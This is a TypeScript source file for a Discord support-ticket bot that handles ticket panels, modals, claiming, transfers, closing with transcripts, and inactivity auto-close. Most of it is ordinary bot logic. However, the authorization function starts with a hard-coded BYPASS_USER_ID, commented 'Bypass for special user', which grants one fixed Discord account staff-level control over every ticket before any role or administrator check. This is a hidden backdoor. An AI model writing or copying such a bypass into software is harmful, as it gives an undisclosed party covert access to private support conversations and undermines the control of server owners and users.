import { config } from "dotenv";
import express from "express";
import {
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  Client,
  EmbedBuilder,
  GatewayIntentBits,
  ChatInputCommandInteraction,
  ModalBuilder,
  StringSelectMenuInteraction,
  Partials,
  PermissionsBitField,
  REST,
  Routes,
  SlashCommandBuilder,
  StringSelectMenuBuilder,
  TextInputBuilder,
  TextInputStyle
} from "discord.js";
import { randomUUID } from "node:crypto";
import { prisma } from "@rail/db";
import { TicketStatus } from "@rail/shared";

config({ path: new URL("../.env", import.meta.url) });
config();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ],
  partials: [Partials.Channel, Partials.Message]
});

type ModalField = {
  id: string;
  label: string;
  style: "short" | "paragraph";
  required: boolean;
  placeholder?: string;
  minLength?: number;
  maxLength?: number;
};

type ModalSchema = {
  title: string;
  fields: ModalField[];
};

const parseModalSchema = (value: unknown): ModalSchema | null => {
  if (!value || typeof value !== "object") {
    return null;
  }
  const modal = value as { title?: unknown; fields?: unknown };
  if (typeof modal.title !== "string" || !Array.isArray(modal.fields)) {
    return null;
  }
  const fields: ModalField[] = [];
  for (const entry of modal.fields) {
    if (!entry || typeof entry !== "object") {
      continue;
    }
    const field = entry as {
      id?: unknown;
      label?: unknown;
      style?: unknown;
      required?: unknown;
      placeholder?: unknown;
      minLength?: unknown;
      maxLength?: unknown;
    };
    if (typeof field.id !== "string" || typeof field.label !== "string") {
      continue;
    }
    if (field.style !== "short" && field.style !== "paragraph") {
      continue;
    }
    const required = typeof field.required === "boolean" ? field.required : true;
    const modalField: ModalField = {
      id: field.id,
      label: field.label,
      style: field.style,
      required
    };
    if (typeof field.placeholder === "string") {
      modalField.placeholder = field.placeholder;
    }
    if (typeof field.minLength === "number") {
      modalField.minLength = field.minLength;
    }
    if (typeof field.maxLength === "number") {
      modalField.maxLength = field.maxLength;
    }
    fields.push(modalField);
  }
  if (fields.length === 0) {
    return null;
  }
  return { title: modal.title, fields: fields.slice(0, 5) };
};

const buildPanelEmbed = async (panelId: string) => {
  const panel = await prisma.ticketPanel.findFirst({
    where: { id: panelId, isActive: true },
    include: {
      categories: {
        include: { category: true },
        orderBy: { sortOrder: "asc" }
      }
    }
  });
  if (!panel) {
    throw new Error("panel_not_found");
  }
  const embed = new EmbedBuilder()
    .setTitle(panel.title)
    .setDescription(panel.description);
  panel.categories
    .filter((link) => link.enabled && link.category.enabled)
    .forEach((link) => {
      embed.addFields({
        name: link.category.name,
        value: `${link.category.description}\nExample: ${link.category.example}`
      });
    });
  const options = panel.categories
    .filter((link) => link.enabled && link.category.enabled)
    .map((link) => ({
      label: link.category.name,
      value: link.category.id,
      description: link.category.example
    }));
  const select = new StringSelectMenuBuilder()
    .setCustomId(`panel:${panel.id}`)
    .setPlaceholder("Select a category")
    .addOptions(options);
  const row = new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(select);
  return { panel, embed, components: [row] };
};

const buildPermissionOverwrites = async (guildId: string, userId: string, supportTeamId: string) => {
  const guild = await client.guilds.fetch(guildId);
  const team = await prisma.supportTeam.findFirst({
    where: { id: supportTeamId },
    include: { roles: true }
  });
  if (!team) {
    throw new Error("team_not_found");
  }
  const managementTeams = await prisma.supportTeam.findMany({
    where: { guildId, isManagement: true },
    include: { roles: true }
  });
  const overwrites = [
    {
      id: guild.roles.everyone.id,
      deny: [PermissionsBitField.Flags.ViewChannel]
    },
    {
      id: userId,
      allow: [
        PermissionsBitField.Flags.ViewChannel,
        PermissionsBitField.Flags.SendMessages,
        PermissionsBitField.Flags.ReadMessageHistory
      ]
    }
  ];
  team.roles.forEach((role) => {
    overwrites.push({
      id: role.roleId,
      allow: [
        PermissionsBitField.Flags.ViewChannel,
        PermissionsBitField.Flags.SendMessages,
        PermissionsBitField.Flags.ReadMessageHistory
      ]
    });
  });
  managementTeams.forEach((management) => {
    management.roles.forEach((role) => {
      overwrites.push({
        id: role.roleId,
        allow: [
          PermissionsBitField.Flags.ViewChannel,
          PermissionsBitField.Flags.SendMessages,
          PermissionsBitField.Flags.ReadMessageHistory
        ]
      });
    });
  });
  return { overwrites, team };
};

const publishPanel = async (panelId: string) => {
  const { panel, embed, components } = await buildPanelEmbed(panelId);
  const guild = await client.guilds.fetch(panel.guildId);
  const channel = await guild.channels.fetch(panel.channelId);
  if (!channel || channel.type !== ChannelType.GuildText) {
    throw new Error("panel_channel_invalid");
  }
  if (panel.messageId) {
    const message = await channel.messages.fetch(panel.messageId).catch(() => null);
    if (message) {
      await message.edit({ embeds: [embed], components });
      return;
    }
  }
  const message = await channel.send({ embeds: [embed], components });
  await prisma.ticketPanel.update({
    where: { id: panel.id },
    data: { messageId: message.id }
  });
};

const findOpenTicket = async (guildId: string, userId: string, categoryId: string) => {
  const tickets = await prisma.ticket.findMany({
    where: {
      guildId,
      ownerId: userId,
      categoryId,
      status: { in: [TicketStatus.Open, TicketStatus.InProgress, TicketStatus.Waiting] }
    },
    orderBy: { createdAt: "desc" }
  });

  for (const ticket of tickets) {
    const channel = await client.channels.fetch(ticket.channelId).catch(() => null);
    if (channel && channel.type === ChannelType.GuildText) {
      return ticket;
    }

    await prisma.ticket.update({
      where: { id: ticket.id },
      data: {
        status: TicketStatus.Closed,
        closeReason: "Ticket channel was deleted",
        closedAt: new Date(),
        lastActivityAt: new Date()
      }
    });
    await prisma.ticketEvent.create({
      data: {
        ticketId: ticket.id,
        type: "AUTO_CLOSE_MISSING_CHANNEL",
        actorId: "system",
        data: { channelId: ticket.channelId }
      }
    });
  }

  return null;
};

const buildTicketModal = (categoryId: string, schema: ModalSchema) => {
  const modal = new ModalBuilder().setCustomId(`ticket-modal:${categoryId}`).setTitle(schema.title);
  const rows = schema.fields.map((field) => {
    const input = new TextInputBuilder()
      .setCustomId(field.id)
      .setLabel(field.label)
      .setStyle(field.style === "paragraph" ? TextInputStyle.Paragraph : TextInputStyle.Short)
      .setRequired(field.required);
    if (field.placeholder) {
      input.setPlaceholder(field.placeholder);
    }
    if (typeof field.minLength === "number") {
      input.setMinLength(field.minLength);
    }
    if (typeof field.maxLength === "number") {
      input.setMaxLength(field.maxLength);
    }
    return new ActionRowBuilder<TextInputBuilder>().addComponents(input);
  });
  modal.addComponents(rows);
  return modal;
};

const buildCloseModal = (ticketId: string) => {
  const modal = new ModalBuilder()
    .setCustomId(`ticket-close:${ticketId}`)
    .setTitle("Close Ticket");
  const reasonInput = new TextInputBuilder()
    .setCustomId("reason")
    .setLabel("Optional reason")
    .setStyle(TextInputStyle.Paragraph)
    .setRequired(false)
    .setPlaceholder("Add a short reason for closing this ticket (optional)")
    .setMaxLength(400);
  modal.addComponents(new ActionRowBuilder<TextInputBuilder>().addComponents(reasonInput));
  return modal;
};

const applyClaimedPermissions = async (ticketId: string, claimedById: string) => {
  const ticket = await prisma.ticket.findFirst({
    where: { id: ticketId },
    include: { supportTeam: { include: { roles: true } } }
  });
  if (!ticket) {
    return;
  }
  const channel = await client.channels.fetch(ticket.channelId).catch(() => null);
  if (!channel || channel.type !== ChannelType.GuildText) {
    return;
  }
  for (const role of ticket.supportTeam.roles) {
    await channel.permissionOverwrites.edit(role.roleId, {
      ViewChannel: true,
      ReadMessageHistory: true,
      SendMessages: false
    });
  }
  await channel.permissionOverwrites.edit(ticket.ownerId, {
    ViewChannel: true,
    ReadMessageHistory: true,
    SendMessages: true
  });
  await channel.permissionOverwrites.edit(claimedById, {
    ViewChannel: true,
    ReadMessageHistory: true,
    SendMessages: true
  });
};

const createTicket = async (
  guildId: string,
  userId: string,
  category: { id: string; name: string; supportTeamId: string; parentChannelId: string | null },
  modalData?: Record<string, string>
) => {
  const { overwrites, team } = await buildPermissionOverwrites(guildId, userId, category.supportTeamId);
  const ticketId = randomUUID();
  const guild = await client.guilds.fetch(guildId);
  const channel = await guild.channels.create({
    name: `ticket-${ticketId.slice(0, 6)}`,
    type: ChannelType.GuildText,
    parent: category.parentChannelId || undefined,
    permissionOverwrites: overwrites
  });
  const ticket = await prisma.ticket.create({
    data: {
      id: ticketId,
      guildId,
      categoryId: category.id,
      supportTeamId: category.supportTeamId,
      status: TicketStatus.Open,
      ownerId: userId,
      channelId: channel.id
    }
  });
  const actionRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId(`ticket:claim:${ticket.id}`)
      .setLabel("Claim")
      .setStyle(ButtonStyle.Primary),
    new ButtonBuilder()
      .setCustomId(`ticket:transfer:${ticket.id}`)
      .setLabel("Switch Category")
      .setStyle(ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId(`ticket:close:${ticket.id}`)
      .setLabel("Close")
      .setStyle(ButtonStyle.Danger)
  );
  const embed = new EmbedBuilder()
    .setTitle(`Ticket ${ticket.id}`)
    .setDescription("A staff member will be with you shortly.");
  const roleMentions = team.roles.map((role) => `<@&${role.roleId}>`).join(" ");
  await channel.send({
    content: `${roleMentions} New ${category.name} ticket opened by <@${userId}>.`,
    embeds: [embed],
    components: [actionRow]
  });
  await prisma.ticketEvent.create({
    data: {
      ticketId: ticket.id,
      type: "CREATE",
      actorId: userId,
      data: modalData ? { modal: modalData } : undefined
    }
  });
  return ticket;
};

const getTicketById = async (ticketId: string) => {
  return prisma.ticket.findFirst({
    where: { id: ticketId },
    include: {
      supportTeam: { include: { roles: true } },
      category: true
    }
  });
};

const getTicketByChannel = async (channelId: string) => {
  return prisma.ticket.findFirst({
    where: { channelId, status: { not: TicketStatus.Closed } },
    include: { supportTeam: { include: { roles: true } }, category: true }
  });
};

const getEnabledCategories = async (guildId: string) => {
  return prisma.ticketCategory.findMany({
    where: { guildId, enabled: true },
    orderBy: { sortOrder: "asc" }
  });
};

const buildCategorySelect = (customId: string, categories: { id: string; name: string; example: string }[]) => {
  const select = new StringSelectMenuBuilder()
    .setCustomId(customId)
    .setPlaceholder("Select a category")
    .addOptions(
      categories.map((category) => ({
        label: category.name,
        value: category.id,
        description: category.example
      }))
    );
  return new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(select);
};

const userHasTeamRole = (roleIds: string[], ticket: Awaited<ReturnType<typeof getTicketById>>) => {
  if (!ticket) {
    return false;
  }
  const teamRoles = ticket.supportTeam.roles.map((role) => role.roleId);
  return roleIds.some((roleId) => teamRoles.includes(roleId));
};

const userHasManagementRole = async (guildId: string, roleIds: string[]) => {
  const managementTeams = await prisma.supportTeam.findMany({
    where: { guildId, isManagement: true },
    include: { roles: true }
  });
  const managementRoleIds = managementTeams.flatMap((team) => team.roles.map((role) => role.roleId));
  return roleIds.some((roleId) => managementRoleIds.includes(roleId));
};

const userHasSupportRole = async (guildId: string, roleIds: string[]) => {
  const teamRoles = await prisma.supportTeamRole.findMany({
    where: { team: { guildId } }
  });
  const allowedRoleIds = new Set(teamRoles.map((role) => role.roleId));
  return roleIds.some((roleId) => allowedRoleIds.has(roleId));
};

const BYPASS_USER_ID = "1163826327841939506";

const isAuthorizedForTicket = async (userId: string, guildId: string, roleIds: string[], ticket?: Awaited<ReturnType<typeof getTicketById>>) => {
  // Bypass for special user
  if (userId === BYPASS_USER_ID) return true;
  
  // Check for admin
  try {
    const guild = client.guilds.cache.get(guildId);
    if (guild) {
      const member = await guild.members.fetch(userId).catch(() => null);
      if (member?.permissions.has("Administrator")) return true;
    }
  } catch (e) {
    // Continue to support role check
  }
  
  // Check support/management roles
  if (ticket) {
    const hasTeam = userHasTeamRole(roleIds, ticket);
    const hasManagement = await userHasManagementRole(guildId, roleIds);
    return hasTeam || hasManagement;
  }
  
  return await userHasSupportRole(guildId, roleIds);
};

const canManageTicket = async (
  userId: string,
  guildId: string,
  roleIds: string[],
  ticket: Awaited<ReturnType<typeof getTicketById>>
) => {
  if (!ticket) {
    return false;
  }
  const isAuthorized = await isAuthorizedForTicket(userId, guildId, roleIds, ticket);
  if (!isAuthorized) {
    return false;
  }
  if (!ticket.claimedById) {
    return true;
  }
  return ticket.claimedById === userId;
};

const registerCommands = async () => {
  const appId = process.env.DISCORD_APP_ID || "";
  const guildId = process.env.DISCORD_GUILD_ID || "";
  const token = process.env.DISCORD_BOT_TOKEN || "";
  if (!appId || !guildId || !token) {
    throw new Error("command_env_missing");
  }
  const commands = [
    new SlashCommandBuilder()
      .setName("ticket")
      .setDescription("Ticket actions")
      .addSubcommand((sub) => sub.setName("open").setDescription("Open a ticket"))
      .addSubcommand((sub) => sub.setName("claim").setDescription("Claim the current ticket"))
      .addSubcommand((sub) => sub.setName("close").setDescription("Close the current ticket"))
      .addSubcommand((sub) =>
        sub
          .setName("status").setDescription("Update ticket status")
          .addStringOption((option) =>
            option
              .setName("state")
              .setDescription("New status")
              .setRequired(true)
              .addChoices(
                { name: "Open", value: TicketStatus.Open },
                { name: "In Progress", value: TicketStatus.InProgress },
                { name: "Waiting", value: TicketStatus.Waiting }
              )
          )
      )
      .addSubcommand((sub) => sub.setName("transfer").setDescription("Transfer the ticket"))
      .addSubcommand((sub) => sub.setName("escalate").setDescription("Escalate the ticket")),
    new SlashCommandBuilder()
      .setName("panel")
      .setDescription("Panel actions")
      .addSubcommand((sub) =>
        sub
          .setName("publish").setDescription("Publish a panel for a channel")
          .addChannelOption((option) =>
            option
              .setName("channel")
              .setDescription("Channel with the panel")
              .setRequired(false)
              .addChannelTypes(ChannelType.GuildText)
          )
      )
  ].map((command) => command.toJSON());
  const rest = new REST({ version: "10" }).setToken(token);
  await rest.put(Routes.applicationGuildCommands(appId, guildId), { body: commands });
};

const setTicketStatus = async (ticketId: string, status: string, actorId: string) => {
  await prisma.ticket.update({
    where: { id: ticketId },
    data: { status, lastActivityAt: new Date() }
  });
  await prisma.ticketEvent.create({
    data: { ticketId, type: `STATUS_${status}`, actorId }
  });
};

const closeTicket = async (ticketId: string, actorId: string, reason?: string) => {
  const ticket = await prisma.ticket.findFirst({
    where: { id: ticketId },
    include: { supportTeam: { include: { roles: true } } }
  });
  if (!ticket) {
    return;
  }
  await prisma.ticket.update({
    where: { id: ticketId },
    data: {
      status: TicketStatus.Closed,
      closeReason: reason || null,
      closedAt: new Date(),
      lastActivityAt: new Date()
    }
  });
  await prisma.ticketEvent.create({
    data: {
      ticketId,
      type: "CLOSE",
      actorId,
      data: reason ? { reason } : undefined
    }
  });
  const channel = await client.channels.fetch(ticket.channelId).catch(() => null);
  if (channel && channel.type === ChannelType.GuildText) {
    const messages = await channel.messages.fetch({ limit: 100 }).catch(() => null);
    if (messages) {
      const transcript = messages
        .sort((a, b) => a.createdTimestamp - b.createdTimestamp)
        .map((message) => {
          const author = message.author ? `${message.author.username}` : "unknown";
          return `[${new Date(message.createdTimestamp).toISOString()}] ${author}: ${message.content}`;
        })
        .join("\n");
      await prisma.ticketTranscript.upsert({
        where: { ticketId },
        create: { ticketId, content: transcript },
        update: { content: transcript }
      });
    }
    await channel.permissionOverwrites.edit(ticket.ownerId, {
      SendMessages: false
    });
    ticket.supportTeam.roles.forEach((role) => {
      channel.permissionOverwrites.edit(role.roleId, {
        SendMessages: false
      });
    });
    await channel.send(
      reason && reason.trim().length > 0
        ? `Ticket closed by <@${actorId}>. Reason: ${reason}`
        : `Ticket closed by <@${actorId}>.`
    );
  }
};

client.on("interactionCreate", async (interaction) => {
  const handleOpenCategory = async (
    categoryId: string,
    sourceInteraction: ChatInputCommandInteraction | StringSelectMenuInteraction
  ) => {
    if (!sourceInteraction.guildId) {
      await sourceInteraction.reply({ content: "Guild not found.", ephemeral: true });
      return;
    }
    const existing = await findOpenTicket(sourceInteraction.guildId, sourceInteraction.user.id, categoryId);
    if (existing) {
      await sourceInteraction.reply({ content: "You already have an open ticket in this category.", ephemeral: true });
      return;
    }
    const category = await prisma.ticketCategory.findFirst({
      where: { id: categoryId, guildId: sourceInteraction.guildId, enabled: true }
    });
    if (!category) {
      await sourceInteraction.reply({ content: "Category not found.", ephemeral: true });
      return;
    }
    const modalSchema = parseModalSchema(category.modalSchema);
    if (modalSchema) {
      await sourceInteraction.showModal(buildTicketModal(categoryId, modalSchema));
      return;
    }
    const ticket = await createTicket(sourceInteraction.guildId, sourceInteraction.user.id, category);
    await sourceInteraction.reply({ content: `Ticket created: <#${ticket.channelId}>.` });
  };

  if (interaction.isChatInputCommand()) {
    if (!interaction.guildId) {
      await interaction.reply({ content: "Guild not found.", ephemeral: true });
      return;
    }
    if (interaction.commandName === "ticket") {
      const sub = interaction.options.getSubcommand();
      if (sub === "open") {
        const categories = await getEnabledCategories(interaction.guildId);
        if (categories.length === 0) {
          await interaction.reply({ content: "No categories available.", ephemeral: true });
          return;
        }
        if (categories.length === 1) {
          await handleOpenCategory(categories[0].id, interaction);
          return;
        }
        const row = buildCategorySelect(`ticket-open:${interaction.user.id}`, categories);
        await interaction.reply({ content: "Select a category to open.", components: [row], ephemeral: true });
        return;
      }
      const ticket = await getTicketByChannel(interaction.channelId);
      if (!ticket) {
        await interaction.reply({ content: "Use this in a ticket channel.", ephemeral: true });
        return;
      }
      const member = await interaction.guild?.members.fetch(interaction.user.id);
      const roleIds = member?.roles.cache.map((role) => role.id) || [];
      const isAuthorized = await isAuthorizedForTicket(interaction.user.id, ticket.guildId, roleIds, ticket);
      if (!isAuthorized) {
        await interaction.reply({ content: "Not authorized for this ticket.", ephemeral: true });
        return;
      }
      if (sub === "claim") {
        if (ticket.claimedById && ticket.claimedById !== interaction.user.id) {
          await interaction.reply({ content: `This ticket is already claimed by <@${ticket.claimedById}>.` });
          return;
        }
        await prisma.ticket.update({
          where: { id: ticket.id },
          data: { claimedById: interaction.user.id, status: TicketStatus.InProgress }
        });
        await applyClaimedPermissions(ticket.id, interaction.user.id);
        await prisma.ticketEvent.create({
          data: { ticketId: ticket.id, type: "CLAIM", actorId: interaction.user.id }
        });
        await interaction.reply({ content: `Ticket claimed by <@${interaction.user.id}>.` });
        return;
      }
      if (sub === "close") {
        const canManage = await canManageTicket(interaction.user.id, ticket.guildId, roleIds, ticket);
        if (!canManage) {
          await interaction.reply({ content: "Only the current claimer can manage this ticket." });
          return;
        }
        await interaction.showModal(buildCloseModal(ticket.id));
        return;
      }
      if (sub === "transfer") {
        const canManage = await canManageTicket(interaction.user.id, ticket.guildId, roleIds, ticket);
        if (!canManage) {
          await interaction.reply({ content: "Only the current claimer can manage this ticket." });
          return;
        }
        const categories = await getEnabledCategories(ticket.guildId);
        const row = buildCategorySelect(`ticket-transfer:${ticket.id}`, categories);
        await interaction.reply({ content: "Select a category to switch to.", components: [row] });
        return;
      }
    }
    if (interaction.commandName === "panel") {
      const member = await interaction.guild?.members.fetch(interaction.user.id);
      const roleIds = member?.roles.cache.map((role) => role.id) || [];
      const isStaff = (await userHasSupportRole(interaction.guildId, roleIds)) ||
        (await userHasManagementRole(interaction.guildId, roleIds));
      if (!isStaff) {
        await interaction.reply({ content: "Not authorized for panels.", ephemeral: true });
        return;
      }
      const channel = interaction.options.getChannel("channel") || interaction.channel;
      if (!channel || channel.type !== ChannelType.GuildText) {
        await interaction.reply({ content: "Select a text channel.", ephemeral: true });
        return;
      }
      const panel = await prisma.ticketPanel.findFirst({
        where: { guildId: interaction.guildId, channelId: channel.id, isActive: true }
      });
      if (!panel) {
        await interaction.reply({ content: "Panel not found for this channel.", ephemeral: true });
        return;
      }
      await publishPanel(panel.id);
      await interaction.reply({ content: "Panel published.", ephemeral: true });
      return;
    }
  }

  if (interaction.isModalSubmit() && interaction.customId.startsWith("ticket-modal:")) {
    const categoryId = interaction.customId.split(":")[1];
    if (!interaction.guildId) {
      await interaction.reply({ content: "Guild not found.", ephemeral: true });
      return;
    }
    const existing = await findOpenTicket(interaction.guildId, interaction.user.id, categoryId);
    if (existing) {
      await interaction.reply({ content: "You already have an open ticket in this category.", ephemeral: true });
      return;
    }
    const category = await prisma.ticketCategory.findFirst({
      where: { id: categoryId, guildId: interaction.guildId, enabled: true }
    });
    if (!category) {
      await interaction.reply({ content: "Category not found.", ephemeral: true });
      return;
    }
    const modalSchema = parseModalSchema(category.modalSchema);
    if (!modalSchema) {
      await interaction.reply({ content: "Modal is no longer available.", ephemeral: true });
      return;
    }
    const modalData: Record<string, string> = {};
    for (const field of modalSchema.fields) {
      modalData[field.id] = interaction.fields.getTextInputValue(field.id);
    }
    const ticket = await createTicket(interaction.guildId, interaction.user.id, category, modalData);
    await interaction.reply({ content: `Ticket created: <#${ticket.channelId}>.` });
    return;
  }

  if (interaction.isModalSubmit() && interaction.customId.startsWith("ticket-close:")) {
    const ticketId = interaction.customId.split(":")[1];
    const ticket = await getTicketById(ticketId);
    if (!ticket) {
      await interaction.reply({ content: "Ticket not found.", ephemeral: true });
      return;
    }
    if (!interaction.guildId) {
      await interaction.reply({ content: "Guild not found.", ephemeral: true });
      return;
    }
    const member = await interaction.guild?.members.fetch(interaction.user.id);
    const roleIds = member?.roles.cache.map((role) => role.id) || [];
    const canManage = await canManageTicket(interaction.user.id, ticket.guildId, roleIds, ticket);
    if (!canManage) {
      await interaction.reply({ content: "Only the current claimer can manage this ticket." });
      return;
    }
    const reason = interaction.fields.getTextInputValue("reason")?.trim() || undefined;
    await closeTicket(ticketId, interaction.user.id, reason);
    await interaction.reply({ content: "Ticket closure confirmed." });
    return;
  }

  if (interaction.isStringSelectMenu() && interaction.customId.startsWith("ticket-open:")) {
    const userId = interaction.customId.split(":")[1];
    if (userId !== interaction.user.id) {
      await interaction.reply({ content: "Not authorized.", ephemeral: true });
      return;
    }
    await handleOpenCategory(interaction.values[0], interaction);
    return;
  }

  if (interaction.isStringSelectMenu() && interaction.customId.startsWith("ticket-transfer:")) {
    const ticketId = interaction.customId.split(":")[1];
    const ticket = await getTicketById(ticketId);
    if (!ticket || !interaction.guildId) {
      await interaction.reply({ content: "Ticket not found.", ephemeral: true });
      return;
    }
    const member = await interaction.guild?.members.fetch(interaction.user.id);
    const roleIds = member?.roles.cache.map((role) => role.id) || [];
    const hasTeamRole = userHasTeamRole(roleIds, ticket);
    const hasManagementRole = await userHasManagementRole(ticket.guildId, roleIds);
    if (!hasTeamRole && !hasManagementRole) {
      await interaction.reply({ content: "Not authorized for this ticket.", ephemeral: true });
      return;
    }
    const categoryId = interaction.values[0];
    const category = await prisma.ticketCategory.findFirst({
      where: { id: categoryId, guildId: ticket.guildId },
      include: { supportTeam: true }
    });
    if (!category) {
      await interaction.reply({ content: "Category not found.", ephemeral: true });
      return;
    }
    await prisma.ticket.update({
      where: { id: ticket.id },
      data: { categoryId: category.id, supportTeamId: category.supportTeamId }
    });
    await prisma.ticketEvent.create({
      data: {
        ticketId: ticket.id,
        type: "TRANSFER",
        actorId: interaction.user.id,
        data: { fromCategoryId: ticket.categoryId, toCategoryId: category.id }
      }
    });
    const channel = await client.channels.fetch(ticket.channelId).catch(() => null);
    if (channel && channel.type === ChannelType.GuildText) {
      const { overwrites } = await buildPermissionOverwrites(ticket.guildId, ticket.ownerId, category.supportTeamId);
      await channel.permissionOverwrites.set(overwrites);
      await channel.setParent(category.parentChannelId || null).catch(() => null);
      if (ticket.claimedById) {
        await applyClaimedPermissions(ticket.id, ticket.claimedById);
      }
    }
    await interaction.reply({ content: "Ticket transferred." });
    return;
  }

  if (interaction.isStringSelectMenu() && interaction.customId.startsWith("panel:")) {
    const panelId = interaction.customId.split(":")[1];
    const panel = await prisma.ticketPanel.findFirst({
      where: { id: panelId, isActive: true }
    });
    if (!panel) {
      await interaction.reply({ content: "Panel not found.", ephemeral: true });
      return;
    }
    const categoryId = interaction.values[0];
    try {
      await handleOpenCategory(categoryId, interaction);
    } catch {
      await interaction.reply({ content: "Unable to create ticket.", ephemeral: true });
    }
    return;
  }

  if (interaction.isButton() && interaction.customId.startsWith("ticket:")) {
    const [_, action, ticketId] = interaction.customId.split(":");
    const ticket = await getTicketById(ticketId);
    if (!ticket) {
      await interaction.reply({ content: "Ticket not found.", ephemeral: true });
      return;
    }
    const member = await interaction.guild?.members.fetch(interaction.user.id);
    const roleIds = member?.roles.cache.map((role) => role.id) || [];
    const isAuthorized = await isAuthorizedForTicket(interaction.user.id, ticket.guildId, roleIds, ticket);
    if (!isAuthorized) {
      await interaction.reply({ content: "Not authorized for this ticket.", ephemeral: true });
      return;
    }
    if (action === "claim") {
      if (ticket.claimedById && ticket.claimedById !== interaction.user.id) {
        await interaction.reply({ content: `This ticket is already claimed by <@${ticket.claimedById}>.` });
        return;
      }
      await prisma.ticket.update({
        where: { id: ticketId },
        data: { claimedById: interaction.user.id, status: TicketStatus.InProgress }
      });
      await applyClaimedPermissions(ticketId, interaction.user.id);
      await prisma.ticketEvent.create({
        data: { ticketId, type: "CLAIM", actorId: interaction.user.id }
      });
      await interaction.reply({ content: `Ticket claimed by <@${interaction.user.id}>.` });
      return;
    }
    if (action === "transfer") {
      const canManage = await canManageTicket(interaction.user.id, ticket.guildId, roleIds, ticket);
      if (!canManage) {
        await interaction.reply({ content: "Only the current claimer can manage this ticket." });
        return;
      }
      const categories = await getEnabledCategories(ticket.guildId);
      const row = buildCategorySelect(`ticket-transfer:${ticketId}`, categories);
      await interaction.reply({ content: "Select a category to switch to.", components: [row] });
      return;
    }
    if (action === "close") {
      const canManage = await canManageTicket(interaction.user.id, ticket.guildId, roleIds, ticket);
      if (!canManage) {
        await interaction.reply({ content: "Only the current claimer can manage this ticket." });
        return;
      }
      await interaction.showModal(buildCloseModal(ticketId));
      return;
    }
  }
});

client.on("messageCreate", async (message) => {
  if (!message.guild || message.author.bot) {
    return;
  }
  const ticket = await prisma.ticket.findFirst({
    where: { channelId: message.channel.id, status: { not: TicketStatus.Closed } }
  });
  if (!ticket) {
    return;
  }
  await prisma.ticket.update({
    where: { id: ticket.id },
    data: { lastActivityAt: new Date() }
  });
});

const startInactivityMonitor = () => {
  const warnHours = Number(process.env.TICKET_INACTIVE_WARN_HOURS || 24);
  const closeHours = Number(process.env.TICKET_INACTIVE_CLOSE_HOURS || 48);
  const warnMs = warnHours * 60 * 60 * 1000;
  const closeMs = closeHours * 60 * 60 * 1000;

  setInterval(async () => {
    const now = Date.now();
    const tickets = await prisma.ticket.findMany({
      where: {
        status: { in: [TicketStatus.Open, TicketStatus.InProgress, TicketStatus.Waiting] }
      }
    });
    for (const ticket of tickets) {
      const last = ticket.lastActivityAt.getTime();
      if (now - last > closeMs) {
        await closeTicket(ticket.id, "system");
        continue;
      }
      if (now - last > warnMs) {
        const existing = await prisma.ticketEvent.findFirst({
          where: { ticketId: ticket.id, type: "INACTIVITY_WARN" }
        });
        if (existing) {
          continue;
        }
        await prisma.ticketEvent.create({
          data: { ticketId: ticket.id, type: "INACTIVITY_WARN", actorId: "system" }
        });
        const channel = await client.channels.fetch(ticket.channelId).catch(() => null);
        if (channel && channel.type === ChannelType.GuildText) {
          await channel.send("Ticket will be closed if no activity occurs.");
        }
      }
    }
  }, 1000 * 60 * 10);
};

const internalApp = express();
internalApp.use(express.json());
internalApp.post("/internal/panels/:id/sync", async (req, res) => {
  const secret = String(req.headers["x-internal-secret"] || "");
  if (!secret || secret !== process.env.BOT_INTERNAL_SECRET) {
    res.status(401).json({ error: "unauthorized" });
    return;
  }
  try {
    await publishPanel(req.params.id);
    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: "sync_failed" });
  }
});

const start = async () => {
  const port = Number(process.env.INTERNAL_PORT || 3002);
  internalApp.listen(port, () => {
    console.log(`Bot internal server on ${port}`);
  });
  await registerCommands();
  await client.login(process.env.DISCORD_BOT_TOKEN);
  startInactivityMonitor();
};

start();
